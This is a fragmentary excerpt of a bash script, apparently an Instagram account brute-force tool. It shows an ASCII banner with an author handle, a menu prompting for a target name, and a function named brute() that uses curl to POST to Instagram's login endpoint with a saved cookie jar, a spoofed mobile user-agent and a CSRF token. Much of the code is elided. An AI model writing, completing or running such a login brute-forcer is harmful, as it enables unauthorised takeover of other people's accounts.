...
__     | _|_ o |_)|_     o (_|
||||_| |  |_ | |_)|  ___ | __|
\e[1;31mcontact: ./Aris1337\e[1;37m
'''
...
case $opt in
    1) #menu 1
        read -p $'\e[37m[\e[34m?\e[37m] Search Name   : \e[1;33m' ask
...
function brute(){
    url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
                    ...
                    -H "user-agent: Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36" \
                    -H "x-csrftoken: ${token}" \
